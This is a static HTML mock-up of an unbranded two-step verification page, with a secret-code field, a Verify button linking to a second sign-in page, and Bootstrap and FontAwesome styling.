<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>2 Step Verification</title>
  <!-- Bootstrap CSS -->
  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
  <!-- FontAwesome CSS -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
      margin: 0;
      padding: 0;
    }
    .header-logo {
      text-align: center;
      font-size: 36px;
      font-weight: bold;
      color: #333;
      margin: 40px 0;
    }
    .header-logo span {
      color: #28a745; /* Green triangle */
    }
    .form-container {
      max-width: 500px;
      margin: 0 auto;
      text-align: center;
    }
    .form-title {
      font-size: 28px;
      font-weight: bold;
      margin-bottom: 10px;
      color: #333;
    }
    .form-subtitle {
      font-size: 16px;
      color: #666;
      margin-bottom: 30px;
    }
    .form-group {
      text-align: left;
    }
    .form-control {
      height: 45px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }
    .btn-green {
      width: 100%;
      height: 50px;
      background-color: #28a745;
      color: #fff;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 20px;
    }
    .btn-green:hover {
      background-color: #218838;
    }
    .return-link {
      margin-top: 20px;
      display: block;
      color: #666;
      font-size: 14px;
      text-decoration: none;
    }
    .return-link:hover {
      text-decoration: underline;
    }
    .language-selector {
      position: absolute;
      top: 20px;
      left: 20px;
    }

  </style>
</head>
<body>
  <!-- Language Selector -->
  <div class="language-selector">
    <select class="form-control" style="width: 150px;">
      <option selected>Spanish</option>
      <option>English</option>
    </select>
  </div>

  <!-- Header Logo -->
  <div class="header-logo">
    <img src="/assets/logo.png" alt="Logo" style="width: 170px; height: auto; margin-left: 20px; margin-top: 10px;">

  </div>

  <!-- Form Container -->
  <div class="form-container">
    <div class="form-title">2 Step Verification</div>
    <div class="form-subtitle">
      
    </div>
    <form>
      <div class="form-group">
        <label for="password" style="font-weight: bold;">Enter Your Secret Code</label>
        <input type="password" id="password" class="form-control" placeholder="Secret Code" required>
      </div>
      <button type="button" class="btn-green">
        <a href="/signin2.html" class="text-decoration-none text-white">Verify</a>
      </button>
      
      <a href="#" class="return-link">Send Again</a>
  </div>



  <!-- FontAwesome Script -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/js/all.min.js"></script>
</body>
</html>
